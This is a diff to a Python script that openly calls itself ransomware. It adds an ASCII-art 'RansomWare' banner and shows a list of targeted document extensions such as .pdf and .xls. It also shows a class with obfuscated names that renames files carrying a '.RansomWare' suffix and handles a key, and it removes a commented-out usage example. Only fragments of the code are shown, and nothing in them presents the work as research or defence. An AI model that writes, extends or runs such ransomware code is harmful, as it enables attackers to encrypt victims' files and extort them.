@@ -4,6 +4,19 @@ import struct
 import threading
 
 
+RansomWareNote = f"""
+
+  _____                             __          __            
+ |  __ \\                            \\ \\        / /            
+ | |__) |__ _ _ __  ___  ___  _ __ __\\ \\  /\\  / /_ _ _ __ ___ 
+ |  _  // _` | '_ \\/ __|/ _ \\| '_ ` _ \\ \\/  \\/ / _` | '__/ _ \\
+ | | \\ \\ (_| | | | \\__ \\ (_) | | | | | \\  /\\  / (_| | | |  __/
+ |_|  \\_\\__,_|_| |_|___/\\___/|_| |_| |_|\\/  \\/ \\__,_|_|  \\___|
+                                                              
+"""
+
+print(RansomWareNote)
+
 TargetFiles = [
     '.pdf',
     '.xls',
@@ -275,11 +288,6 @@ class iurgubnrgr:
         os.rename(self.filename, self.filename.replace(".RansomWare", ""))
 
     def args_start(self, filename, key):
-        # if False == True:
-        #     print("Usage: sudo python3 RansomWare.py <filename/.txt/.png/.jpg> <key/sha640>")
-        #     print("Example: sudo python3 RansomWare.py cat.png 3f307c4a23b754bc8e6f4a119ca4558e0e06d99287810e175ed870cea26fccd2b1354a4b49303a10")
-        #     sys.exit(1)
-
         self.filename = filename
         self.key = mmeee(key.encode("utf-8"))
         self.switch = self.switch_the_switch()
